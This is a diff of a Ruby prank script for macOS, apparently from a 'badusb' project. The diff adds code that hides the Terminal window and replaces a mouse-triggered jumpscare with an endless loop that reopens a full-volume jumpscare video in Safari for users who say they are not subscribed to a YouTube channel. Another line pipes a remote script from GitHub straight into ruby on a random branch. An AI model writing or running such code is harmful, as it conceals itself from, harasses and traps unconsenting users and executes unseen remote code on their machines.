@@ -2,6 +2,9 @@
 require 'open-uri'
 require 'tempfile'
 
+# --- Hide Terminal Window ---
+system("osascript -e 'tell application \"Terminal\" to set visible of front window to false'")
+
 # --- Helper Method: Display Dialog with Finder Icon using AppleScript ---
 def display_dialog(message, buttons, default)
   button_list = "{" + buttons.map { |b| "\"#{b}\"" }.join(", ") + "}"
@@ -25,62 +28,6 @@ def set_volume_to_max
   end
 end
 
-# --- Mouse Movement Detection ---
-# Uses Python to query the seconds since the last mouse movement (via Quartz).
-def mouse_moved_recently?(threshold = 0.1)
-  # Use /usr/bin/python which should be available on macOS.
-  output = `python -c "import Quartz; print(Quartz.CGEventSourceSecondsSinceLastEventType(0, 5))"`.strip
-  seconds = output.to_f
-  seconds < threshold
-rescue
-  false
-end
-
-# --- Create Temporary HTML for Full-Screen Jumpscare ---
-def create_jumpscare_html(video_url)
-  html_content = <<-HTML
-<html>
-  <head>
-    <meta charset="UTF-8">
-    <title>JumpScare</title>
-    <style>
-      html, body { margin: 0; padding: 0; height: 100%; background-color: black; }
-      video { width: 100%; height: 100%; object-fit: cover; }
-    </style>
-  </head>
-  <body>
-    <video id="video" autoplay muted playsinline>
-      <source src="#{video_url}" type="video/mp4">
-      Your browser does not support the video tag.
-    </video>
-    <script>
-      var video = document.getElementById('video');
-      video.play();
-      if (video.requestFullscreen) { video.requestFullscreen(); }
-      else if (video.webkitRequestFullscreen) { video.webkitRequestFullscreen(); }
-      else if (video.msRequestFullscreen) { video.msRequestFullscreen(); }
-      video.muted = false;
-      video.play();
-    </script>
-  </body>
-</html>
-  HTML
-  temp = Tempfile.new(['jumpscare', '.html'])
-  temp.write(html_content)
-  temp.close
-  temp.path
-end
-
-# --- Trigger a Full-Screen Jumpscare ---
-# Opens Safari with a temporary HTML file that embeds the video.
-def trigger_fullscreen_jumpscare(video_url, duration=1)
-  set_volume_to_max
-  html_file = create_jumpscare_html(video_url)
-  system("open -a Safari '#{html_file}'")
-  sleep duration
-  system("osascript -e 'tell application \"Safari\" to close front window'")
-end
-
 # --- Branch: Run Secret Script ---
 def run_secret_script
   system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
@@ -93,47 +40,61 @@ def trigger_winner_jumpscare
   system("open -a Safari '#{winner_url}'")
 end
 
+# --- Persistent Jumpscare Loop for Non-Subscribers ---
+# This loop uses AppleScript to check if Safari has a tab containing the target URL.
+def persistent_jumpscare(target_url)
+  # Initially open Safari with the target URL.
+  set_volume_to_max
+  system("open -a Safari '#{target_url}'")
+  
+  loop do
+    sleep 3
+    apple_script_check = %Q(
+tell application "Safari"
+  set found to false
+  repeat with w in windows
+    repeat with t in tabs of w
+      if (URL of t) contains "jumpscare2.mp4" then
+        set found to true
+      end if
+    end repeat
+  end repeat
+  if found is false then
+    open location "#{target_url}"
+  end if
+end tell)
+    system("osascript -e '#{apple_script_check}'")
+  end
+end
+
 # --- Main Program Flow ---
 
-# First dialog: "Are you subscribed to my YouTube channel?"
-subscribed = display_dialog("Are you subscribed to my YouTube channel?\n(https://www.youtube.com/channel/UC8L0XgGChOWiMQ0uM2lWbMg)", ["Yes", "No"], "Yes")
+# First prompt: "Are you subscribed to MrWoooper?"
+response = display_dialog("Are you subscribed to MrWoooper?", ["Yes", "No"], "Yes")
 
-if subscribed.nil?
+if response.nil?
   puts "No response received. Exiting."
   exit 0
 end
 
-if subscribed.downcase == "no"
-  # Not subscribed: Wait 1 second then trigger mouse-based jumpscare mode.
-  sleep 1
-  puts "Jumpscare mode activated. Move your mouse to trigger a jumpscare."
-  jumpscare_count = 0
-  cooldown = 10  # seconds between jumpscares
-  last_jumpscare = Time.now - cooldown
-  # Fixed raw link for jumpscare2.mp4
+if response.downcase == "no"
+  # Non-subscriber branch: immediately play the jumpscare video.
+  # Use the raw link for jumpscare2.mp4.
   jumpscare_video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
-  
-  while jumpscare_count < 10
-    if mouse_moved_recently? && (Time.now - last_jumpscare >= cooldown)
-      last_jumpscare = Time.now
-      puts "Mouse movement detected! Triggering jumpscare #{jumpscare_count + 1}..."
-      trigger_fullscreen_jumpscare(jumpscare_video_url, 1)
-      jumpscare_count += 1
-      sleep 5  # cooldown after each jumpscare trigger
-    end
-    sleep 0.1
-  end
+  persistent_jumpscare(jumpscare_video_url)
 else
-  # Subscribed: Prompt for button selection.
-  button_choice = display_dialog("Choose a button:", ["Button A", "Button B"], "Button A")
+  # Subscriber branch: prompt for button selection.
+  button_message = "Choose a button: (You have a 50% chance of something good happening to you)"
+  button_choice = display_dialog(button_message, ["Button A", "Button B"], "Button A")
   if button_choice.nil?
     puts "No button chosen. Exiting."
     exit 0
   end
-  # Random 50/50 outcome.
+  # Random outcome 50/50:
   if rand < 0.5
     run_secret_script
   else
+    # Show "You won!" dialog and then trigger winner jumpscare.
     `osascript -e 'display dialog "You won!" buttons {"OK"} default button "OK" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"'`
     trigger_winner_jumpscare
   end
